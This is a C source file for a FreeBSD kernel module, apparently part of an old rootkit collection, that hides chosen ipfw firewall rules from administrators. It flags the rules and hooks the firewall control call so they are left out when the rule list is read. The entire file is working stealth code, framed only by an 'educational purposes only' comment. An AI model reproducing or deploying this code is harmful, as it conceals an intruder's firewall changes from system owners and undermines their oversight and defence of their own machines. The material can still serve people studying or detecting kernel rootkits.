/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    Parts of this are derived from ip_fw.c
 *
 *    $Id: fw.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This shows how to hide a firewall rule.
 *
 *    This software was written for educational purposes only.
 */

#include <sys/types.h>
#include <sys/param.h> 
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/malloc.h>
#include <sys/sysproto.h>
#include <sys/sysent.h>
#include <sys/proc.h>
#include <sys/lock.h>
#include <sys/module.h>
#include <sys/linker.h>
#include <sys/fcntl.h>   
#include <sys/libkern.h>   
#include <sys/namei.h>
#include <sys/sysctl.h>
#include <sys/linker.h>
#include <sys/queue.h>
#include <sys/socketvar.h>
#include <machine/elf.h>
#include <netinet/in.h>
#include <netinet/ip_fw.h>

#include "../config.h"
#include "util.h"
#include "fw.h"

#ifdef NETWORK_HACKS

#define IP_FW_F_HIDDEN 0x80000000

#define TIME_LEQ(a,b)       ((int)((a)-(b)) <= 0)

extern LIST_HEAD (ip_fw_head, ip_fw_chain) ip_fw_chain_head;
/* extern ip_fw_ctl_t *ip_fw_ctl; */
extern ip_fw_ctl_t *old_ip_fw_ctl_ptr;
extern struct ipfw_dyn_rule **ipfw_dyn_v;
extern u_int32_t curr_dyn_buckets;

/*
 *    hide the firewall rules with the given number
 */

int
hide_rule(u_short rulenum)
{
    int error;
    struct ip_fw_chain *fcp;
    struct ip_fw *entry;

    /* default not found */
    error = EINVAL;

    LIST_FOREACH(fcp, &ip_fw_chain_head, next) {

        entry = (struct ip_fw *)fcp->rule;

        if(entry->fw_number == rulenum) {

            /* found the right entry */
            mod_debug("Hiding firewall rule %d\n",rulenum);
            entry->fw_flg |= IP_FW_F_HIDDEN;
            error = 0;
        }
    }

    return(error);
}

/*
 *    unhide the firewall rules with the given number
 */

int
unhide_rule(u_short rulenum)
{
    int error;
    struct ip_fw_chain *fcp;
    struct ip_fw *entry;

    /* default not found */
    error = EINVAL;

    LIST_FOREACH(fcp, &ip_fw_chain_head, next) {

        entry = (struct ip_fw *)fcp->rule;

        if(entry->fw_number == rulenum) {

            /* found the right entry */
            mod_debug("Unhiding firewall rule %d\n",rulenum);
            entry->fw_flg &= ~(IP_FW_F_HIDDEN);
            error = 0;
        }
    }

    /* not found */
    return(error);
}

/*
 *    Hide a given firewall rule from view.
 *
 *    Note: this will not prevent its deletion or anything
 *    for this you'd have to add a list of rule numbers to be 
 *    hidden, because it'll only pass the number to delete rule
 *    without the hidden flag. See the netstat hiding stuff for 
 *    a list example.
 */ 

int 
new_ip_fw_ctl(struct sockopt *sopt)
{
    int error;
    int size;
    struct ip_fw_chain *fcp;
    struct ip_fw *bp , *buf;

    error = 0;

    /* 
     *    if the request is not get, just pass it on to the 
     *    original function 
     */
        
    if(sopt->sopt_name != IP_FW_GET) 
         return(old_ip_fw_ctl_ptr(sopt));

    size = 0 ;
    LIST_FOREACH(fcp, &ip_fw_chain_head, next) {

        if(!(((struct ip_fw *)fcp->rule)->fw_flg & IP_FW_F_HIDDEN)) 
            size += sizeof(struct ip_fw);
    }

    if (ipfw_dyn_v) {
        int i ;
        struct ipfw_dyn_rule *p ;

        for (i = 0 ; i < curr_dyn_buckets ; i++ )
            for ( p = ipfw_dyn_v[i] ; p != NULL ; p = p->next )
                size += sizeof(*p) ;
    }
    buf = malloc(size, M_TEMP, M_WAITOK);
    if (buf == 0) 
        return(ENOBUFS);

    bp = buf ;
    LIST_FOREACH(fcp, &ip_fw_chain_head, next) {

        if(!(((struct ip_fw *)fcp->rule)->fw_flg & IP_FW_F_HIDDEN)) {
            bcopy(fcp->rule, bp, sizeof *fcp->rule);
            bp->pipe_ptr = (void *)(intptr_t) ((struct ip_fw_ext *)fcp->rule)->dont_match_prob;
            bp->next_rule_ptr = (void *)(intptr_t) ((struct ip_fw_ext *)fcp->rule)->dyn_type;
            bp++;
        }
    }
    if (ipfw_dyn_v) {
        int i ;
        struct ipfw_dyn_rule *p, *dst, *last = NULL ;

        dst = (struct ipfw_dyn_rule *)bp ;
        for (i = 0 ; i < curr_dyn_buckets ; i++ )
            for ( p = ipfw_dyn_v[i] ; p != NULL ; p = p->next, dst++ ) {
                bcopy(p, dst, sizeof *p);
                (int)dst->chain = p->chain->rule->fw_number ;
                dst->next = dst ; /* fake non-null pointer... */
                last = dst ;
                if (TIME_LEQ(dst->expire, time_second) )
                    dst->expire = 0 ;
                else
                    dst->expire -= time_second ;
            }
        if (last != NULL)
                last->next = NULL ;
    }
    error = sooptcopyout(sopt, buf, size);
    FREE(buf, M_TEMP);

    return(error);
}

#endif /* NETWORK_HACKS */


